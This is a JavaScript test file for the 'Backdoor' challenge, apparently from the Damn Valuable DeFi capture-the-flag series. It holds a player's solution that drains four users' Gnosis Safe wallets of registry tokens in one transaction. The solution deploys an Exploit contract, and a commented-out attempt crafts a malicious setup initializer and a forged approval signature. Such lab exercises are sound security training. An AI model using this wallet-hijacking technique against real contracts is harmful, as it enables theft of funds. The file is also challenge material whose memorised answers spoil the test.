const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, player;
    let masterCopy, walletFactory, token, walletRegistry;

    const AMOUNT_TOKENS_DISTRIBUTED = 40n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, player] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            masterCopy.address,
            walletFactory.address,
            token.address,
            users
        );
        expect(await walletRegistry.owner()).to.eq(deployer.address);

        for (let i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            expect(
                await walletRegistry.beneficiaries(users[i])
            ).to.be.true;

            // User cannot add beneficiaries
            await expect(
                walletRegistry.connect(
                    await ethers.getSigner(users[i])
                ).addBeneficiary(users[i])
            ).to.be.revertedWithCustomError(walletRegistry, 'Unauthorized');
        }

        // Transfer tokens to be distributed to the registry
        await token.transfer(walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        /*
        const myProxy = await (await ethers.getContractFactory("contracts/backdoor/Exploit.sol:MyGnosisSafe", deployer)).deploy();
        const data = myProxy.interface.encodeFunctionData("initialize", []);
        const initializer = masterCopy.interface.encodeFunctionData(
            "setup",
            [
                [alice.address], // owners
                1, // threashold
                myProxy.address, // to
                data, // data
                "0x0000000000000000000000000000000000000000", // fallbackHandler
                "0x0000000000000000000000000000000000000000", // paymentToken
                0, // payment
                "0x0000000000000000000000000000000000000000" // paymentReceiver
            ]
        );

        const txResponse = await walletFactory.createProxyWithCallback(
            masterCopy.address,
            initializer,
            0,
            walletRegistry.address);
        const receipt = await txResponse.wait();
        const event = receipt.events?.find(e => e.event === 'ProxyCreation');

        let proxy = event.args['proxy'];
        const gnosisSafeJson = require("@gnosis.pm/safe-contracts/build/artifacts/contracts/GnosisSafe.sol/GnosisSafe.json");
        const contract = new ethers.Contract(event.args['proxy'], gnosisSafeJson.abi, ethers.provider);
        console.log(await contract.approvedHashes("0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
        "0x69520eea857ba37ecf5de9a8055acd30c7e87dbb27cbde7d1a77eb00b677efa5"));

        let bytes = await contract.getTransactionHash(
            "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
            0,
            [],
            0, // operation
            0, // safeTxGas
            0, // baseGas
            0, // gasPrice
            "0x0000000000000000000000000000000000000000", // gasToken
            "0x0000000000000000000000000000000000000000", // refundReceiver
            0
        );

        console.log(bytes);

        let signature = ethers.utils.defaultAbiCoder.encode(
            ['bytes32', 'bytes32'],
            [
                "0x000000000000000000000000" + "70997970c51812dc3a010c7d01b50e0d17dc79c8",
                "0x0000000000000000000000000000000000000000000000000000000000000000",
            ]   
        );
        signature += "01";
        console.log(signature);

        await contract.connect(player).execTransaction(
            "0x70997970c51812dc3a010c7d01b50e0d17dc79c8",
            0,
            [],
            0, // operation
            0, // safeTxGas
            0, // baseGas
            0, // gasPrice
            "0x0000000000000000000000000000000000000000", // gasToken
            "0x0000000000000000000000000000000000000000", // refundReceiver
            signature
        );
        */

        let contract = await (await ethers.getContractFactory("./contracts/backdoor/Exploit.sol:Exploit", player)).deploy(
            [alice.address, bob.address, charlie.address, david.address],
            masterCopy.address,
            walletRegistry.address,
            walletFactory.address,
            token.address,
            player.address
        );
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player must have used a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);

        for (let i = 0; i < users.length; i++) {
            let wallet = await walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(
                ethers.constants.AddressZero,
                'User did not register a wallet'
            );

            // User is no longer registered as a beneficiary
            expect(
                await walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
